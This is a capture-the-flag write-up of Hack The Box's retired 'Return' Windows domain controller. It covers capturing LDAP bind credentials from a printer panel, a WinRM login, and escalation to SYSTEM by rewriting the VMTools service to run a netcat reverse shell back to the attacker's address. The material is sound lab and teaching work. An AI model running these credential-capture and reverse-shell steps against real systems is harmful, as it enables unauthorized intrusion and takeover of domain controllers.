---
title: "Hack The Box — Return"
summary: "Return leaks a printer's LDAP bind credentials through a server change; WinRM access and Server Operators service control then lead to SYSTEM."
platform: "Hack The Box"
contentType: "machine"
publicationPolicy: "retired"
difficulty: "Easy"
os: "Windows"
solvedAt: 2026-11-23
publishedAt: 2026-11-23
tags:
  - active-directory
  - ldap-passback
  - credential-disclosure
  - winrm
  - server-operators
  - service-configuration
  - privilege-escalation
tools:
  - Nmap
  - Netcat
  - Evil-WinRM
  - PowerShell
  - sc.exe
cves: []
htbUrl: "https://app.hackthebox.com/machines/Return"
cover: "/images/writeups/hackthebox/machines/return/return.png"
coverAlt: "Hack The Box Return machine logo showing a ticket passed between two hands inside a green circle"
featured: false
draft: false
---

> This write-up documents an authorized Hack The Box lab. The [Return machine profile](https://app.hackthebox.com/machines/Return) displays **Writeups Available** and an **Official Writeup** download; the profile states that write-ups unlock when content is retired. This meets the [HTB publication rule](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines). Flag values and session-specific target and VPN addresses are omitted. The service-account password below is a fixed credential of this retired lab and is included to make the steps reproducible.

## Executive summary

Return is a Windows Active Directory domain controller with an exposed printer administration panel. Its LDAP settings let a visitor replace the LDAP server address while the panel keeps a configured bind account and password. Pointing that address at a listener on the attacker's VPN interface causes the printer application to send an LDAP bind containing the credentials. The `svc-printer` account can log in through WinRM and belongs to `Server Operators`. That group can manage services on a domain controller. Reconfiguring the `VMTools` service, which runs as `LocalSystem`, to launch a reverse shell gives a SYSTEM command prompt. The attack crosses two trust boundaries: from an unauthenticated web setting to a privileged credential, then from delegated service management to SYSTEM execution.

## Target information

| Item | Value |
| --- | --- |
| Target | Return (`PRINTER`) |
| Domain | `return.local` |
| Platform | Hack The Box |
| Difficulty | Easy |
| Operating system | Windows |
| Publication policy | Retired; official write-up available on the [machine profile](https://app.hackthebox.com/machines/Return) |
| Solved | 23 November 2026 |
| Main weaknesses | LDAP credential passback through printer settings; service configuration by `Server Operators` |

HTB assigns a target IP to each running instance. Substitute your own machine address and your own `tun0` address wherever the commands use `<TARGET_IP>` and `<YOUR_TUN0_IP>`.

## Enumeration

I scanned every TCP port with default scripts and service detection:

```bash
nmap <TARGET_IP> -T5 -sVC -p-
```

The useful portion of the result was:

```text
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
80/tcp   open  http         Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec Microsoft Windows Kerberos
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: return.local)
445/tcp  open  microsoft-ds
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0
```

The HTTP title was **HTB Printer Admin Panel**. Kerberos, LDAP, DNS and SMB suggested a domain controller. Port 5985 exposed WinRM, but it required credentials. Several high, filtered ports in the full scan were not needed for this route. Nmap warned that its retransmission cap had been reached with `-T5`; the open services above were still visible, so I moved to the web panel.

Open `http://<TARGET_IP>/` and inspect **Settings**. The panel has LDAP connection fields, including **Server Address**, a bind username and a masked password. The important question is whether changing the server address makes the application authenticate to a host we control.

### Findings

| Evidence | Why it mattered |
| --- | --- |
| The printer panel was reachable without a login | Its settings could be tested immediately. |
| The panel stored LDAP bind credentials | A connection to a chosen server might transmit those credentials. |
| WinRM listened on TCP/5985 | Captured account credentials could provide an interactive foothold. |

## Initial access

### Capture the LDAP bind

First, identify the Kali VPN address. Use the IPv4 address on `tun0`, not the Kali LAN address:

```bash
ip -4 -br addr show tun0
```

In a separate **Kali** terminal, listen on TCP/389:

```bash
sudo nc -lvnp 389
```

Port 389 is privileged on Linux, so this listener needs `sudo`. Return to the printer panel, replace only **Server Address** with `<YOUR_TUN0_IP>`, and press **Update**. The application connects back to the listener and sends an LDAP bind. Netcat prints binary protocol bytes mixed with readable strings. Look for the account name and the password following it, rather than expecting neatly formatted output:

```text
connect to [<YOUR_TUN0_IP>] from [<TARGET_IP>]
... return\svc-printer ... 1edFg43012!!
```

The account is `return\svc-printer` and the retired lab password is `1edFg43012!!`. The web form's masked password was not a reliable way to read it; redirecting the bind showed what the application actually sent.

### Log in through WinRM

Open another **Kali** terminal and use the captured credential. Single quotes prevent the shell from interpreting the exclamation marks:

```bash
evil-winrm -i <TARGET_IP> -u 'svc-printer' -p '1edFg43012!!'
```

The resulting `*Evil-WinRM* PS ...>` prompt is a PowerShell session as `svc-printer`. Read the user flag if you are completing the lab, but do not include its value in public notes:

```powershell
Get-Content C:\Users\svc-printer\Desktop\user.txt
```

## Privilege escalation

### Check group membership and privileges

In the **Evil-WinRM** session, enumerate the account:

```powershell
whoami /groups
whoami /priv
```

The observed groups included `BUILTIN\Server Operators`, `BUILTIN\Print Operators` and `BUILTIN\Remote Management Users`. The token also had enabled `SeBackupPrivilege` and `SeRestorePrivilege`. The actionable route here was service management: [Microsoft documents](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups) that Server Operators on a domain controller can stop and start services.

Check a service before changing it:

```powershell
sc.exe qc VMTools
sc.exe query VMTools
```

On Return, `VMTools` was running and reported `SERVICE_START_NAME : LocalSystem`. Its original binary path was:

```text
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
```

Save that value for restoration. Use `sc.exe` explicitly because `sc` can resolve to a PowerShell alias. `sc.exe config` changes the service's binary path in the Service Control Manager. This works here because the account can reconfigure this particular service; group membership alone is not proof that every service is writable.

### Stage the reverse shell

On **Kali**, locate the Windows build of Netcat:

```bash
find /usr/share -type f -iname 'nc.exe' 2>/dev/null | head
```

The tested Kali installation had `/usr/share/windows-resources/binaries/nc.exe`. In **Evil-WinRM**, change to the desired remote directory *before* uploading and omit the remote-path argument:

```powershell
cd C:\Users\svc-printer\Documents
upload /usr/share/windows-resources/binaries/nc.exe
Get-Item .\nc.exe | Select-Object FullName,Length
```

`upload` is an Evil-WinRM command, not a PowerShell cmdlet. Its source path is on Kali; with no destination argument, it saves into the current remote directory. Confirm that the path exists and the upload completed before changing the service.

Start a listener in a **Kali** terminal:

```bash
nc -lvnp 9001
```

Back in **Evil-WinRM**, point `VMTools` at the uploaded executable, stop the original service and start the modified one. Replace `<YOUR_TUN0_IP>` with the address you found earlier:

```powershell
sc.exe config VMTools binPath= "C:\Users\svc-printer\Documents\nc.exe -e C:\Windows\System32\cmd.exe <YOUR_TUN0_IP> 9001"
sc.exe stop VMTools
sc.exe start VMTools
```

The space after `binPath=` is required by [`sc.exe config`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config). If the service was already stopped during an earlier attempt, skip the `stop` command. The `start` command can report **1053** because Netcat is not a normal Windows service and does not respond to the Service Control Manager in time. Check the listener anyway: in the observed run, it received a command shell despite that timeout.

In the **Netcat** shell, verify the identity and reach the administrator's desktop:

```cmd
whoami
dir C:\Users\Administrator\Desktop
type C:\Users\Administrator\Desktop\root.txt
```

The shell is expected to report `nt authority\system`. The root flag's value is intentionally omitted.

### Restore the service

After confirming SYSTEM access, restore the original VMware Tools executable from the still-open **Evil-WinRM** PowerShell session:

```powershell
sc.exe --% config VMTools binPath= """C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"""
sc.exe qc VMTools
```

The `--%` token preserves the quoting needed around a path with spaces when passing it from PowerShell to a native command. Check that `BINARY_PATH_NAME` again matches the saved original value. Then exit the Netcat shell. If `sc.exe query VMTools` shows `STOPPED`, run `sc.exe start VMTools` and confirm `RUNNING`. Finally, remove the uploaded `nc.exe` from `C:\Users\svc-printer\Documents` after its process exits.

## What did not work

- The first `find /usr/share ...` was entered at the Evil-WinRM prompt. That is remote PowerShell, not Kali; PowerShell interpreted `2>/dev/null` as a Windows path. Run Linux commands at a `kali@kali` prompt.
- Supplying an unquoted Windows destination to Evil-WinRM's `upload` command produced a malformed path under the current directory. A later interrupted upload left a shorter `nc.exe` on the Desktop. Pointing `VMTools` at a missing file returned **error 2**; pointing it at the incomplete executable returned **error 193**. Uploading with no destination from the intended remote directory, checking the resulting file and then updating `binPath` fixed both failures.
- The final `sc.exe start VMTools` returned **1053**, but the listener had already received the reverse shell. This error reflected the service protocol mismatch, not failure of the command execution.

## Attack path

1. Enumerate TCP services and identify the unauthenticated printer administration panel.
2. Change its LDAP server address to the Kali `tun0` IP and capture the bind as `svc-printer`.
3. Authenticate to WinRM and verify `Server Operators` membership.
4. Identify `VMTools` as a manageable service running under `LocalSystem`.
5. Temporarily change its binary path to Netcat, start it and receive a SYSTEM shell.
6. Restore the original service configuration.

## Lessons learned

- A masked password in a device management UI can still leave the application if a user can redirect its authentication endpoint. Restrict who may change LDAP endpoints, validate approved destinations and protect bind credentials.
- A low-privilege domain account in `Server Operators` can become highly privileged through service control on a domain controller. Review membership and service permissions as part of Active Directory hardening.
- When a service exploit fails, distinguish a missing binary (**2**), an invalid executable (**193**) and a service that started a process but did not complete service initialization (**1053**). Confirm the artifact path and listener state before changing tactics.

## References

- [Hack The Box — Return machine profile](https://app.hackthebox.com/machines/Return)
- [Hack The Box write-up publication guidelines](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines)
- [Microsoft — Active Directory security groups](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups)
- [Microsoft — `sc.exe config`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config)
- [Microsoft — PowerShell argument parsing](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_parsing?view=powershell-5.1)
- [Evil-WinRM project](https://github.com/Hackplayers/evil-winrm)
